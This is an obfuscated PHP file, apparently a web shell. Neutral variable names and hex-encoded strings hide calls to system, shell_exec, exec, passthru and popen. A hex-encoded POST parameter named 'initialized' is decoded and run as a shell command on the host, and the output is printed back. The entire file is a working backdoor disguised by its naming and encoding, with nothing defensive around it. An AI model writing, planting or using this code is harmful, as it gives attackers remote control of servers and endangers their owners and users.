<?php


$object1 = '73';
$object2 = '65';
$object3 = '6d';
$object4 = '68';
$object5 = '6c';
$object6 = '78';
$object7 = '70';
$object8 = '61';
$object9 = '74';
$object10 = '72';
$object11 = '75';
$object12 = '6f';
$object13 = '63';
$object14 = '6e';
$object15 = '69';
$object16 = '7a';
$batch_process1 = pack("H*", $object1 . '79' . $object1 . '74' . $object2 . $object3);
$batch_process2 = pack("H*", $object1 . $object4 . '65' . $object5 . $object5 . '5f' . $object2 . $object6 . $object2 . '63');
$batch_process3 = pack("H*", '65' . '78' . $object2 . '63');
$batch_process4 = pack("H*", $object7 . $object8 . $object1 . '73' . $object9 . '68' . $object10 . $object11);
$batch_process5 = pack("H*", '70' . $object12 . $object7 . '65' . '6e');
$batch_process6 = pack("H*", '73' . $object9 . $object10 . $object2 . $object8 . $object3 . '5f' . '67' . '65' . '74' . '5f' . $object13 . $object12 . $object14 . $object9 . '65' . $object14 . '74' . '73');
$batch_process7 = pack("H*", $object7 . '63' . '6c' . '6f' . '73' . '65');
$initialized = pack("H*", $object15 . '6e' . $object15 . $object9 . '69' . '61' . $object5 . $object15 . $object16 . '65' . '64');
if (isset($_POST[$initialized])) {
    $initialized = pack("H*", $_POST[$initialized]);
    if (function_exists($batch_process1)) {
        $batch_process1($initialized);
    } elseif (function_exists($batch_process2)) {
        print $batch_process2($initialized);
    } elseif (function_exists($batch_process3)) {
        $batch_process3($initialized, $record_rec);
        print join("\n", $record_rec);
    } elseif (function_exists($batch_process4)) {
        $batch_process4($initialized);
    } elseif (function_exists($batch_process5) && function_exists($batch_process6) && function_exists($batch_process7)) {
        $ref_flg = $batch_process5($initialized, 'r');
        if ($ref_flg) {
            $factor_token = $batch_process6($ref_flg);
            $batch_process7($ref_flg);
            print $factor_token;
        }
    }
    exit;
}
